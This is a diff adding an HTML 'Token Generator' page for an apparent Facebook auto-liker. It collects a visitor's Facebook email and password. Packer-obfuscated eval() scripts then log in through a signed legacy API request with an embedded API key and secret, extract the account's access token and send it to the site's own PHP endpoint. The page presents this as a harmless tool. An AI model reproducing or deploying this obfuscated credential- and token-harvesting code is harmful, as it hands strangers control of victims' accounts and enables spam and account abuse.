@@ -1,0 +1,114 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-141261513-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-141261513-1');
+</script>
+    <link href="//fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.8/css/materialize.min.css">
+        <link href="assets/css/bootstrap.css" rel="stylesheet">
+    <link href="assets/css/bootstrap-responsive.css" rel="stylesheet">
+    <link href="assets/css/flat-ui.css" rel="stylesheet">
+    <link href="assets/css/flatten.css" rel="stylesheet">
+    <link href="assets/css/flat-prettify.css" rel="stylesheet">
+    <link href="assets/css/font-awesome.min.css" rel="stylesheet">
+    <link href="assets/css/flatten.css" rel="stylesheet">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans+Condensed:700' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Chau+Philomene+One:400,400italic' rel='stylesheet' type='text/css'>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="css/style.css">
+    <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/skins/colors/red.css" name="colors">
+    <link rel="stylesheet" href="css/layout/wide.css" name="layout">    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Rocky Liker | Token Generator</title>
+    <meta name="Description" content="Free Autolike NO SPAM">
+    <meta name="ROBOTS" content="INDEX, FOLLOW">
+    <link rel="shortcut icon" href="assets/favicon.png">
+<script src="../js/jquery.min.js"></script>
+</head>
+<body>
+<div class="container">
+<div class="row">
+
+        <div style="margin-top: 20px" class="col s12 m10 offset-m1 l8 offset-l2">
+
+            <div class="col s12">
+            <div class="row z-depth-1 ">
+            <div class="col s12" style="background-color: rgb(14, 77, 121);height: 50px;">
+                <br><h5 class="white-text center-align" style="height: 50px;">Login With Facebook For Generate Token</h5>
+            </div>
+            <div class="col s12"><br>
+                
+
+            </div>
+            <div class="col s12 center-align">
+                <div class="section">
+
+
+
+
+  <div class="form-group">
+    <div class="col-sm-10">
+      <input type="text" class="form-control" name="u" id="email" placeholder="Email,Username or Phone" required="" vk_1f312="subscribed" style="width: 311px;height: 27px;">
+    </div>
+  </div>
+<br>
+  <div class="form-group">
+    <div class="col-sm-10">
+      <input type="password" class="form-control" name="p" id="pwd" placeholder="Password or App Password" required="" vk_1f312="subscribed" style="width: 311px;height: 27px;">
+    </div>
+  </div>
+  <div class="form-group">
+    <div class="col-sm-offset-2 col-sm-10">
+<br>
+      <button type="submit" onclick="Run()" class="btn btn-black btn-large" style="padding: 15px 31px;font-size: 25px;">Get Token</button>
+    </div>
+  </div>
+</div>
+
+<blockquote style="border-left:5px solid #3fbd98;margin: 0px 0px;margin-left: 0px">
+If You Want You Can Login With Your App Password <a target="_blank" rel="nofollow" href="https://mbasic.facebook.com/new_sec_settings/app_passwords/?step=generate" style="color: #d30000;"> Click Here for create one</a><br>
+We'll never share or sell Your Information to Any 3rd Party. <br>
+If you have any doubt then advise you to create a fake account and use that account to login.<br>
+</blockquote>
+
+<br><br>
+
+                
+            </div>
+            </div>
+            </div>
+
+        </div>
+                
+
+     <div id="tokendata" style="display:none;margin-top: 30px;width: 100%;"></div>         
+
+
+
+                </div>
+            </div>
+        </div>
+
+                                                
+        
+</div>
+</div>
+
+
+<script>
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('q 3h(){$(\'#J\').3i();$(\'#J\').1o(\'\');b R=$(\'#G\').1f();b Z=$(\'#3f\').1f();T(R!=""&&Z!=""){b G=R;b U=Z;b 1z="3R://3O.3P.3G/3D.1N";b 1s="3B";b 1q=q(d){1D=M(V(Y(X(d),8*d.B)));s 1D.3C()};q M(d){y(b a,m="3H",f="",r=0;r<d.B;r++)a=d.1J(r),f+=m.1G(a>>>4&15)+m.1G(15&a);s f}q X(d){y(b a=1l(d.B>>2),m=0;m<a.B;m++)a[m]=0;y(m=0;m<8*d.B;m+=8)a[m>>5]|=(1M&d.1J(m/8))<<m%32;s a}q V(d){y(b a="",m=0;m<32*d.B;m+=8)a+=3L.3J(d[m>>5]>>>m%32&1M);s a}q Y(d,a){d[a>>5]|=2H<<a%32,d[14+(a+1Y>>>9<<4)]=a;y(b m=2m,f=-2k,r=-1W,i=2h,n=0;n<d.B;n+=16){b h=m,t=f,g=r,e=i;f=k(f=k(f=k(f=k(f=c(f=c(f=c(f=c(f=j(f=j(f=j(f=j(f=l(f=l(f=l(f=l(f,r=l(r,i=l(i,m=l(m,f,r,i,d[n+0],7,-2I),f,r,d[n+1],12,-2w),m,f,d[n+2],17,2Z),i,m,d[n+3],22,-3W),r=l(r,i=l(i,m=l(m,f,r,i,d[n+4],7,-2g),f,r,d[n+5],12,2f),m,f,d[n+6],17,-27),i,m,d[n+7],22,-2a),r=l(r,i=l(i,m=l(m,f,r,i,d[n+8],7,2J),f,r,d[n+9],12,-2L),m,f,d[n+10],17,-2R),i,m,d[n+11],22,-2S),r=l(r,i=l(i,m=l(m,f,r,i,d[n+12],7,2Y),f,r,d[n+13],12,-2o),m,f,d[n+14],17,-2u),i,m,d[n+15],22,2t),r=j(r,i=j(i,m=j(m,f,r,i,d[n+1],5,-2s),f,r,d[n+6],9,-2q),m,f,d[n+11],14,2y),i,m,d[n+0],20,-2E),r=j(r,i=j(i,m=j(m,f,r,i,d[n+5],5,-2B),f,r,d[n+10],9,2A),m,f,d[n+15],14,-2z),i,m,d[n+4],20,-2C),r=j(r,i=j(i,m=j(m,f,r,i,d[n+9],5,2D),f,r,d[n+14],9,-2G),m,f,d[n+3],14,-2F),i,m,d[n+8],20,2x),r=j(r,i=j(i,m=j(m,f,r,i,d[n+13],5,-2r),f,r,d[n+2],9,-2p),m,f,d[n+7],14,2v),i,m,d[n+12],20,-2V),r=c(r,i=c(i,m=c(m,f,r,i,d[n+5],4,-2U),f,r,d[n+8],11,-2T),m,f,d[n+11],16,2W),i,m,d[n+14],23,-2X),r=c(r,i=c(i,m=c(m,f,r,i,d[n+1],4,-30),f,r,d[n+4],11,2K),m,f,d[n+7],16,-2M),i,m,d[n+10],23,-2N),r=c(r,i=c(i,m=c(m,f,r,i,d[n+13],4,2Q),f,r,d[n+0],11,-2P),m,f,d[n+3],16,-2O),i,m,d[n+6],23,31),r=c(r,i=c(i,m=c(m,f,r,i,d[n+9],4,-25),f,r,d[n+12],11,-29),m,f,d[n+15],16,26),i,m,d[n+2],23,-2b),r=k(r,i=k(i,m=k(m,f,r,i,d[n+0],6,-2i),f,r,d[n+7],10,2d),m,f,d[n+14],15,-2c),i,m,d[n+5],21,-28),r=k(r,i=k(i,m=k(m,f,r,i,d[n+12],6,2e),f,r,d[n+3],10,-2l),m,f,d[n+10],15,-2n),i,m,d[n+1],21,-1Z),r=k(r,i=k(i,m=k(m,f,r,i,d[n+8],6,24),f,r,d[n+15],10,-1X),m,f,d[n+6],15,-2j),i,m,d[n+13],21,3F),r=k(r,i=k(i,m=k(m,f,r,i,d[n+4],6,-3K),f,r,d[n+11],10,-3M),m,f,d[n+2],15,3N),i,m,d[n+9],21,-3I),m=u(m,h),f=u(f,t),r=u(r,g),i=u(i,e)}s 1l(m,f,r,i)}q E(d,a,m,f,r,i){s u(1v(u(u(a,d),u(f,i)),r),m)}q l(d,a,m,f,r,i,n){s E(a&m|~a&f,d,a,r,i,n)}q j(d,a,m,f,r,i,n){s E(a&f|m&~f,d,a,r,i,n)}q c(d,a,m,f,r,i,n){s E(a^m^f,d,a,r,i,n)}q k(d,a,m,f,r,i,n){s E(m^(a|~f),d,a,r,i,n)}q u(d,a){b m=(N&d)+(N&a);s(d>>16)+(a>>16)+(m>>16)<<16|N&m}q 1v(d,a){s d<<a|d>>>32-a};b x={"3Z":"3Y","G":G,"40":"41","42":"33","1K":"3X.3Q","U":U,"3S":0,"v":"1.0"};b H="";y(b w 19 x){T(x.1B(w)){H+=w+"="+x[w]}}H+=1s;b S=1q(H);x["S"]=S;b Q="";y(b w 19 x){T(x.1B(w)){Q+="&"+w+"="+x[w]}}b 1e=1z+"?"+Q;$(\'#J\').1o(\'<o p="D C 1b 1c 1h-1i"><o p="1P z-1F-1"><o p="D C"A="18-O:1m(14,1j,1k);K:1H;"><1T><F p="1U-I L-P" A="1S-1R:1Q;">3T 1V W 3V 1O 1I</F></o><o p="D C"> <1d A="18-O:#3U;" 3A="0" 1p="3z%" K="3e%" 3d="\'+1e+\'"></1d> </o></o></o><o p="D C 1b 1c 1h-1i L-P"><o p="D C" A="18-O:1m(14,1j,1k);K:1H;"><1T><F p="1U-I L-P" A="1S-1R:1Q;">1u 1V W 3g 1O 1I</F></o><o p="1P z-1F-1"><o p="D C"><o p="3c"> <1a 1K="3b" 36="../1g-1A-35-34.1N"> <o p="1L-37"> <1L 38="1u W /1A 3a" p="39" 3j="3k" 3u="1y()" 1C="I" 3t="3v" A="1p:3w;"> <1E 3y="3x:;" 1C="1x" 3s="3r" p="1n 1t-3m 1t-3l 1n-3n-19" 3o="1w.1r=\\\'1r\\\';1w.1a.1x();1y();" A="I-3q:3p;">1g</1E></1a></o>\');$(\'#J\').3E()}}',62,251,'||||||||||_|var|md5_hh|||||||md5_gg|md5_ii|md5_ff|||div|class|function||return||safe_add||key|data|for||style|length|s12|col|md5_cmn|h5|email|str|text|tokendata|height|center||65535|color|align|params|var1|sig|if|password||Code|||var2|||||||||background|in|form|m8|l8|iframe|url|val|Login|offset|l2|77|121|Array|rgb|btn|html|width|md5|disabled|API_SECRET|waves|Paste|bit_rol|this|submit|submit_value|BASE_URL|Token|hasOwnProperty|type|result|button|depth|charAt|50px|Box|charCodeAt|method|input|255|php|The|row|35px|size|font|br|white|All|1732584194|30611744|64|2054922799|||||1873313359|640364487|530742520|1473231341|57434055|421815835|45705983|995338651|1416354905|1126891415|1700485571|1200080426|176418897|271733878|198630844|1560198380|271733879|1894986606|1732584193|1051523|40341101|51403784|1069501632|1444681467|165796510|1236535329|1502002290|1735328473|389564586|1163531501|643717713|660478335|38016083|701558691|405537848|568446438|373897302|187363961|1019803690|128|680876936|1770035416|1272893353|1958414417|155497632|1094730640|722521979|358537222|681279174|42063|1990404162|2022574463|378558|1926607734|1839030562|35309556|1804603682|606105819|1530992060|76029189||vi_vn|Web|To|action|append|placeholder|span2|Here|get|section|src|50|pwd|In|Run|hide|id|shit|light|effect|log|onclick|uppercase|transform|Submit|value|name|oninput|user|510px|javascript|href|100|frameborder|62f8ce9f74b12f84c123cc23437a4a32|toLowerCase|restserver|show|1309151649|com|0123456789ABCDEF|343485551|fromCharCode|145523070|String|1120210379|718787259|api|facebook|login|https|return_ssl_resources|Copy|77ffb4|From|1044525330|auth|882a8490361da98702bf97a021ddc14d|api_key|format|JSON|locale'.split('|'),0,{}))
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('H G(){3 d=$(\'#d\').F();3 x=I.J("E");m{3 8=x.9.2(\'n=\')[1].2(\'"\')[0];7.6="../f-k-l-g.5?h="+8}p(o){}m{3 8=x.9.2(\'n":"\')[1].2(\'"\')[0];7.6="../f-k-l-g.5?h="+8}p(o){3 4=x.9.2(\'c":"\')[1].2(\'"\')[0];b(4=="f L K q. N A u y C a B z D v w M (Q)"){7.6="17-13.5?14="+d}e{3 4=x.9.2(\'c":"\')[1].2(\'"\')[0];b(4=="Z 15 16 12 X q R.O.Y (P)"){7.6="j.5?i=10"}e{3 4=x.9.2(\'c":"\')[1].2(\'"\')[0];b(4=="s t r d S (T)"){7.6="j.5?i=11"}e{3 4=x.9.2(\'c":"\')[1].2(\'"\')[0];b(4=="s t r W (V)"){7.6="j.5?i=11"}e{3 8="U";7.6="../f-k-l-g.5?h="+8}}}}}}',62,70,'||split|var|zx|php|href|location|token|value||if|error_msg|email|else|Login|Web|user||index|Token|To|try|access_token|err|catch|on|or|Invalid|username|SMS|for|log||shortly|to|an|code|with|use|shit|val|submit_value|function|document|getElementById|are|approvals|in|Expect|facebook|405|406|www|address|400|Rocky|401|password|account|com|User|||their|sms|userid|must|verify|Logins'.split('|'),0,{}))
+</script>
+
+
+</body>
+</html>
